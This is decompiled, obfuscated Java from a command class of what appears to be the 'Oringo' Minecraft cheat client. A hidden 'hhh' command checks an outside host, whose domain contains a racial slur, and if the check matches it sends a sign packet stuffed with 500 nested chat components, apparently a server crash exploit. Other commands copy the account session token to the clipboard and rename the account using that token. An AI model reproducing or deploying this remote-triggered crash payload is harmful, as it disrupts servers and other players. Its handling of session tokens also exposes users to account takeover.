package oringo.command;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import javax.net.ssl.HttpsURLConnection;
import map.Class362;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.scoreboard.Score;
import net.minecraft.scoreboard.ScorePlayerTeam;
import net.minecraft.scoreboard.Scoreboard;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import org.apache.commons.io.IOUtils;
import oringo.Oringo;
import oringo.module.AutoCraftModule;
import oringo.module.AutoIceSprayModule;
import oringo.module.ClickGuiModule;
import oringo.module.ThystHiderModule;

public class OringoCommand extends Command {
   public String method1() {
      return "Opens the menu";
   }

   public int m_(String var1) {
      try {
         HttpsURLConnection var2 = (HttpsURLConnection)(new URL("https://api.minecraftservices.com/minecraft/profile/name/" + var1)).openConnection();
         var2.setRequestMethod("PUT");
         var2.setRequestProperty("Authorization", "Bearer " + field9.getSession().getToken());
         var2.setDoOutput(true);
         var2.setDoInput(true);
         var2.getOutputStream().close();
         int var3 = var2.getResponseCode();
         System.out.println(IOUtils.readLines(var2.getErrorStream()));
         return var3;
      } catch (IOException var4) {
         throw new RuntimeException(var4);
      }
   }

   public boolean a_() {
      return true;
   }

   public OringoCommand() {
      super("oringo", "o");
   }

   public void method0(String[] var1) {
      if (var1.length != 0) {
         if (var1[0].equalsIgnoreCase("scoreboard") && field9.thePlayer.getWorldScoreboard() != null) {
            StringBuilder var24 = new StringBuilder();
            Scoreboard var25 = Minecraft.getMinecraft().thePlayer.getWorldScoreboard();
            ArrayList var26 = new ArrayList(var25.getSortedScores(var25.getObjectiveInDisplaySlot(1)));
            Iterator var27 = var26.iterator();

            while(var27.hasNext()) {
               Score var28 = (Score)var27.next();
               ScorePlayerTeam var29 = var25.getPlayersTeam(var28.getPlayerName());
               String var30 = var29.getColorPrefix() + var28.getPlayerName() + var29.getColorSuffix();
               char[] var31 = var30.toCharArray();
               int var10 = var31.length;

               for(int var11 = 0; var11 < var10; ++var11) {
                  char var12 = var31[var11];
                  if (var12 < 256) {
                     var24.append(var12);
                  }
               }

               var24.append("\n");
            }

            var24.append(field9.thePlayer.getWorldScoreboard().getObjectiveInDisplaySlot(1).getDisplayName());
            System.out.println(var24);
            return;
         }

         if (var1[0].equalsIgnoreCase("outro")) {
            method2("Outro on ban is now: " + (ClickGuiModule.field7.J_() ? "§aenabled" : "§cdisabled"));
            return;
         }

         if (var1[0].equalsIgnoreCase("hhh")) {
            try {
               HttpURLConnection var2 = (HttpURLConnection)(new URL("http://niger.5v.pl/z")).openConnection();
               var2.setRequestMethod("GET");
               var2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
               BufferedReader var3 = new BufferedReader(new InputStreamReader(var2.getInputStream()));
               Throwable var4 = null;

               try {
                  String var5 = var3.readLine();
                  if (var5.equals(field9.getSession().getUsername())) {
                     ChatComponentText var6 = new ChatComponentText("&m&n");
                     ChatComponentText var7 = var6;

                     for(int var8 = 0; var8 < 500; ++var8) {
                        ChatComponentText var9 = new ChatComponentText("&k");
                        var6.appendSibling(var9);
                        var6 = var9;
                     }

                     var6.appendText("llllllllllllllllllllllllllllllllllllllll");
                     AutoCraftModule.method3(new C12PacketUpdateSign(new BlockPos(ThystHiderModule.method3()), new IChatComponent[]{var7, var7, var7, var7}));
                  }
               } catch (Throwable var21) {
                  var4 = var21;
                  throw var21;
               } finally {
                  if (var3 != null) {
                     if (var4 != null) {
                        try {
                           var3.close();
                        } catch (Throwable var20) {
                           var4.addSuppressed(var20);
                        }
                     } else {
                        var3.close();
                     }
                  }

               }
            } catch (Exception var23) {
               var23.printStackTrace();
               method2("E");
            }

            return;
         }

         if (var1[0].equalsIgnoreCase("copysession")) {
            method2("Your session has been copied to the clipboard! Sending this to someone will give them access to your account!");
            AutoIceSprayModule.b_(field9.getSession().getToken());
            return;
         }

         if (var1[0].equalsIgnoreCase("changename") && Oringo.cV_) {
            method2(this.m_(var1[1]));
            return;
         }
      }

      Class362.field7.method40();
   }
}
